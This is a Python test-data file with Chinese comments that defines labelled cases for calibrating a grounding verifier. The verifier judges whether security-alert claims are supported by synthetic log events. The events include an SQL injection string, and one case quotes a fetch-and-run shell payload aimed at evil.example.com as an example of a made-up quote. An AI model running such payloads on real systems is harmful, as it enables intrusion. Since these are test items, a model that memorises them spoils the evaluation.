"""
P3: Grounding 阈值标定数据集（可复现标注集）。

修复前 `_VERDICT_GROUNDED_THRESHOLD = 0.8` / `_VERDICT_PARTIAL_THRESHOLD = 0.4`
以及六个层权重，**全仓没有任何标定脚本、标注集或测试**支撑 ——
它们是「看起来合理」的常数，而不是「被数据验证过」的常数。

这个文件就是那份缺失的证据。每条样本带人工标注的 `expect`：
  grounded    —— 断言确实站得住，应判 grounded
  partial     —— 部分站得住，应判 partially_grounded
  ungrounded  —— 站不住，应判 ungrounded

标注口径（与 P0-C-1 的硬性否决一致）：
  · 「断言的每个事实都能在引用事件里找到」→ grounded
  · 「一部分引文找不到，但没有一条是凭空捏造 ID/幻影实体」→ partial
  · 「引用了不存在的事件 / 引文全假 / 幻影 IP / 证据自相矛盾 / 零证据」→ ungrounded

两个必须分清的概念（本文件 v2 修订的原因）：
  · **部分可溯源**（partial）：引文有真有假 → 这是本验证器能表达的东西
  · **过度断言**（over-claim）：事件只证明 A，断言升级成 B（如「发生了传输」
    被说成「已确认泄露」）→ 这是语义蕴含问题，**程序化字段匹配结构上看不见**。
  v1 曾把一条 over-claim 样本标成 partial，实测得 0.90 = grounded。
  错的不是实现，是标注把两个不同轴的问题混成了一个。

维护约定：
  新增样本时**先写 expect，再看实现算出的分数**。若实现与标注冲突，
  那是实现的问题，不是标注的问题 —— 不要为了让测试变绿去改 expect。
  确实检不出的类别用 `known_gap` 字段显式登记，由评估器单独记账，
  既不混入准确率，也不允许被悄悄忽略。
"""
from __future__ import annotations

import datetime as _dt


def _fresh_ts() -> str:
    """证据时间取「现在 - 5 分钟」，**不**写死绝对日期。

    `grounding_verifier._EVIDENCE_TTL_SECONDS = 86400`，证据新鲜度是硬悬崖
    （要么 1.0 要么 0.0）。这里原本写死 `2026-10-18T00:00:00+00:00`，一旦
    那个时刻距今超过 24h，本数据集全部事件的 freshness 一起掉到 0，
    每条用例的 `grounding_score` 被扣 0.10。

    实测（2026-10-19 10:17 UTC，锚点已过期 34.3h）：
      accuracy / confusion / hard_fail_coverage → 不变（判定没有跨档位）
      separation.min_grounded                → 0.8，刷新后 0.9
    即判定质量没被污染，但**同一套黄金集在 TTL 过期前后报出的诊断数值不同**，
    与本仓库其它数据集写明的意图「固定值 = 可复现」矛盾。

    固定锚点适合「窗口边界」（`detection_cases` / `behavior_cases` 就是
    这么用的），不适合任何按「现在」度量的 TTL / 新鲜度 / 过期判定。
    """
    return (_dt.datetime.now(_dt.timezone.utc)
            - _dt.timedelta(minutes=5)).isoformat()


def _evt(eid, **kw):
    """构造一个最小事件。"""
    base = {
        "id": eid,
        "session_id": "s1",
        "event_type": "UNKNOWN",
        "severity": "info",
        "src_ip": "",
        "dst_ip": "",
        "message": "",
        "raw_data": {},
        "anomaly_score": 0.0,
        "correlation_id": "",
        "created_at": _fresh_ts(),
        "analyzed": True,
    }
    base.update(kw)
    return base


# ═══════════════════════════════════════════
# 场景 A：干净的单源告警（最常见的正常情况）
# ═══════════════════════════════════════════

SSH_BRUTEFORCE = _evt(
    1,
    event_type="SSH_BRUTEFORCE",
    severity="high",
    src_ip="10.0.0.9",
    dst_ip="10.0.0.5",
    message="failed password for root from 10.0.0.9 port 51234 ssh2",
)

C2_BEACON = _evt(
    2,
    event_type="C2_BEACON",
    severity="high",
    src_ip="203.0.113.45",
    dst_ip="10.0.0.5",
    message="outbound beacon to 203.0.113.45 every 60s size 512",
)

SQLI = _evt(
    3,
    event_type="WEB_ATTACK",
    severity="medium",
    src_ip="198.51.100.7",
    dst_ip="10.0.0.80",
    message="GET /index.php?id=1' OR '1'='1 -- from 198.51.100.7",
)

DATA_EXFIL = _evt(
    4,
    event_type="DATA_TRANSFER",
    severity="critical",
    src_ip="10.0.0.5",
    dst_ip="203.0.113.99",
    message="outbound transfer 4.2GB to 203.0.113.99 over https",
)

# ═══════════════════════════════════════════
# 场景 B：正常但「无引用文本」的断言
# 修复前的口径里这类拿到 grounding_ratio=1.0（空真）
# ═══════════════════════════════════════════

PRIVILEGE_ESC = _evt(
    5,
    event_type="PRIVILEGE_ESCALATION",
    severity="high",
    src_ip="10.0.0.9",
    dst_ip="10.0.0.5",
    message="user root changed to uid 0 via sudo",
)

# ═══════════════════════════════════════════
# 场景 C：跨源矛盾（同一断言链上的两条事件互相打架）
# ═══════════════════════════════════════════

XFER_OK = _evt(
    6,
    event_type="DATA_TRANSFER",
    severity="info",
    src_ip="10.0.0.5",
    dst_ip="10.0.0.99",
    message="transfer allowed to 10.0.0.99, 120 bytes",
)

XFER_DENIED = _evt(
    7,
    event_type="DATA_TRANSFER",
    severity="high",
    src_ip="10.0.0.5",
    dst_ip="10.0.0.99",
    message="transfer denied by policy to 10.0.0.99",
)


# ═══════════════════════════════════════════
# 标注样本
# 每条：id / 说明 / 事件池 / 断言 / 期望档位
# ═══════════════════════════════════════════

CASES = [
    # ── grounded：每个事实都能溯源 ──────────────────────
    {
        "id": "clean_ssh_bruteforce",
        "note": "典型单源告警，断言与事件逐字对应",
        "events": [SSH_BRUTEFORCE],
        "claim": {
            "type": "BRUTEFORCE",
            "confidence": 0.9,
            "evidence_ids": [1],
            "evidence_quotes": ["failed password for root from 10.0.0.9"],
            "severity": "high",
            "summary": "root 账户遭到 SSH 口令爆破，源 10.0.0.9",
        },
        "expect": "grounded",
    },
    {
        "id": "clean_c2_beacon",
        "note": "周期性外连，IP 与内容均可溯源",
        "events": [C2_BEACON],
        "claim": {
            "type": "C2",
            "confidence": 0.85,
            "evidence_ids": [2],
            "evidence_quotes": ["outbound beacon to 203.0.113.45 every 60s"],
            "severity": "high",
            "summary": "主机 10.0.0.5 周期性向 203.0.113.45 外连，疑似 C2",
        },
        "expect": "grounded",
    },
    {
        "id": "clean_sqli",
        "note": "注入 payload 原文出现在事件里",
        "events": [SQLI],
        "claim": {
            "type": "SQLI",
            "confidence": 0.8,
            "evidence_ids": [3],
            "evidence_quotes": ["1' OR '1'='1"],
            "severity": "medium",
            "summary": "来自 198.51.100.7 的 SQL 注入尝试",
        },
        "expect": "grounded",
    },
    {
        "id": "no_quote_but_ids_valid",
        "note": "无引用文本但 ID 有效且断言内容确与事件一致",
        "events": [PRIVILEGE_ESC],
        "claim": {
            "type": "PRIVESC",
            "confidence": 0.7,
            "evidence_ids": [5],
            "evidence_quotes": [],
            "severity": "high",
            "summary": "root 权限被提升",
        },
        "expect": "grounded",
    },

    # ── ungrounded：事实层面造假（硬性否决四类）──────────
    {
        "id": "fabricated_event_id",
        "note": "引用了根本不存在的事件 —— 凭空造证据",
        "events": [SSH_BRUTEFORCE],
        "claim": {
            "type": "BRUTEFORCE",
            "confidence": 0.95,
            "evidence_ids": [1, 999999],
            "evidence_quotes": ["failed password for root from 10.0.0.9"],
            "severity": "high",
            "summary": "存在另一条相关爆破记录",
        },
        "expect": "ungrounded",
    },
    {
        "id": "all_quotes_fabricated",
        "note": "引文在事件里一个字都找不到",
        "events": [SSH_BRUTEFORCE],
        "claim": {
            "type": "EXPLOIT",
            "confidence": 0.95,
            "evidence_ids": [1],
            "evidence_quotes": [
                "payload: /bin/sh -c curl evil.example.com|sh",
            ],
            "severity": "critical",
            "summary": "日志中出现反弹 shell payload",
        },
        "expect": "ungrounded",
    },
    {
        "id": "phantom_ip",
        "note": "断言提到事件里根本不存在的 IP",
        "events": [C2_BEACON],
        "claim": {
            "type": "C2",
            "confidence": 0.9,
            "evidence_ids": [2],
            "evidence_quotes": ["outbound beacon to 203.0.113.45 every 60s"],
            "severity": "high",
            "summary": "主机 10.0.0.5 向 198.18.7.7 建立 C2 通道",
        },
        "expect": "ungrounded",
    },
    {
        "id": "cross_source_conflict",
        "note": "两条证据互相矛盾（允许 vs 拒绝同一目的地）",
        "events": [XFER_OK, XFER_DENIED],
        "claim": {
            "type": "DATA_EXFIL",
            "confidence": 0.9,
            "evidence_ids": [6, 7],
            "evidence_quotes": [
                "transfer allowed to 10.0.0.99, 120 bytes",
                "transfer denied by policy to 10.0.0.99",
            ],
            "severity": "high",
            "summary": "数据外传成功",
        },
        "expect": "ungrounded",
    },

    # ── partial：部分引文找不到，但没有一条是编造 ──────────
    {
        "id": "partially_traceable_exfil",
        "note": "2 条引文只有 1 条能溯源 —— 这正是 partially_grounded 的定义",
        "events": [DATA_EXFIL],
        "claim": {
            "type": "DATA_EXFIL",
            "confidence": 0.6,
            "evidence_ids": [4],
            "evidence_quotes": [
                "outbound transfer 4.2GB",   # 原文有
                "客户数据库已确认泄露",        # 原文没有
            ],
            "severity": "critical",
            "summary": "数据外传至 203.0.113.99",
        },
        "expect": "partial",
    },

    # ── ungrounded：零证据（P3 新增）─────────────────────
    # 这两条是 P3 标定工作直接挖出来的：v1 数据集没有覆盖「完全没有证据」，
    # 于是「零证据」这一整类失效模式在标定里是盲区。
    {
        "id": "zero_evidence_no_ip",
        "note": "零证据断言且摘要不含 IP —— id/quotes/entity/freshness/chain 五维全部空真",
        "events": [SSH_BRUTEFORCE],
        "claim": {
            "type": "DATA_EXFILTRATION",
            "confidence": 0.93,
            "evidence_ids": [],
            "evidence_quotes": [],
            "severity": "critical",
            "summary": "数据库已被完全控制，全部客户数据被加密后外传至境外",
        },
        "expect": "ungrounded",
    },
    {
        "id": "zero_evidence_with_ip",
        "note": "同为零证据但摘要带 IP —— 空 evidence_ids 使引用事件为空，"
                "任何 IP 都成幻影 IP。这条是被**巧合**拦下的，不是被设计拦下的，"
                "所以两条必须都在：只留带 IP 的那条会让人误以为防线是设计过的",
        "events": [SSH_BRUTEFORCE],
        "claim": {
            "type": "PRIVILEGE_ESCALATION",
            "confidence": 0.93,
            "evidence_ids": [],
            "evidence_quotes": [],
            "severity": "critical",
            "summary": "内网主机 10.0.0.5 已被完全控制并向外传输了全部数据库",
        },
        "expect": "ungrounded",
    },

    # ── grounded 上界：KB 命中时 knowledge 层才拿满分 ──────
    {
        "id": "kb_supported_bruteforce",
        "note": "KB 命中 → knowledge 层满分 → 干净样本上界 1.00，"
                "用来确认 0.8 阈值不是贴着天花板设的",
        "events": [SSH_BRUTEFORCE],
        "knowledge": [{"threat_types": ["BRUTEFORCE"], "content": "SSH 暴力破解"}],
        "claim": {
            "type": "BRUTEFORCE",
            "confidence": 0.9,
            "evidence_ids": [1],
            "evidence_quotes": ["failed password for root from 10.0.0.9"],
            "severity": "high",
            "summary": "root 账户遭到 SSH 口令爆破，源 10.0.0.9",
        },
        "expect": "grounded",
    },

    # ── 已知缺口：过度断言（不计入准确率）────────────────
    {
        "id": "overclaim_chinese_natural_language",
        "note": "事件只证明「发生了一次大流量外传」，断言升级为「已确认客户数据泄露」；"
                "中文摘要里的这类语义过度断言，字段级匹配结构上看不见",
        "events": [DATA_EXFIL],
        "claim": {
            "type": "DATA_EXFIL",
            "confidence": 0.6,
            "evidence_ids": [4],
            "evidence_quotes": ["outbound transfer 4.2GB"],
            "severity": "critical",
            "summary": "已确认 4.2GB 客户数据外泄至 203.0.113.99",
        },
        "expect": "ungrounded",
        "known_gap": "over_claim_not_detectable",
    },
]


def events_for(case: dict) -> list:
    """取出该样本用到的事件对象（按引用顺序，可能重复）。"""
    return list(case["events"])


def knowledge_for(case: dict) -> list:
    """取出该样本的 RAG 知识分片（无则为空列表）。

    注意 ops_loop.filter_fresh_chunks：无 valid_until 字段视为永不过期，
    所以这里只需要 threat_types 即可命中。
    """
    return list(case.get("knowledge") or [])


def event_index_for(case: dict) -> dict:
    """构造 grounding_verifier 期望的事件索引。"""
    return {e["id"]: e for e in case["events"]}
